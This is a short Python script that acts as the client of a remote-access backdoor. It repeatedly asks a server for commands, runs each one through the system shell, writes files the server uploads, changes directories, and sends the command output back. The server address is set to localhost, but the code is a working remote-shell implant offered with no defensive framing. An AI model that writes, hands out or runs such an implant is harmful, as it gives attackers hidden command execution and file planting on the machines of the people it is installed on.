import requests
import os
import json
import subprocess
import base64


SERVER_IP = 'http://127.0.0.1:5000'
cwd = os.getcwd()


def send(output):
    requests.post(SERVER_IP + '/server/send', json=output)


def main():
    global cwd
    while True:
        try:
            payload: dict = json.loads(requests.post(SERVER_IP + '/server/recv', timeout=10).text)
            cmd = payload.get('command')

            if cmd == 'exit':
                requests.post(SERVER_IP + '/bye', timeout=10)

            if cmd == 'upload':
                filename = payload.get('filename')
                filedata = base64.b64decode(payload.get('filedata', ''))
                file_path = os.path.join(cwd, filename)
                try:
                    with open(file_path, 'wb') as f:
                        f.write(filedata)
                    send({'output': f"Uploaded to {file_path}", 'error': None, 'cwd': cwd})
                except Exception as e:
                    send({'output': None, 'error': f"Upload failed: {e}", 'cwd': cwd})
                continue

            if cmd.startswith('cd '):
                parts = cmd.split(maxsplit=1)
                new_path = os.path.abspath(os.path.join(cwd, parts[1]))
                os.path.isdir(new_path)
                if os.path.isdir(new_path):
                    cwd = new_path
                    send({'output': '', 'error': None, "cwd": cwd})
                else:
                    send({'output': None, "error": f"cd: path '{new_path}' was not found.", "cwd": cwd})
                continue

        except requests.exceptions.ReadTimeout:
            continue

        result: subprocess.CompletedProcess[bytes] = subprocess.run(cmd, shell=True, capture_output=True, cwd=cwd)
        output = result.stdout.decode()
        error = result.stderr.decode()
        output = output if output else None

        send({'error': error, 'output': output, 'cwd': cwd})


if __name__ == '__main__':
    main()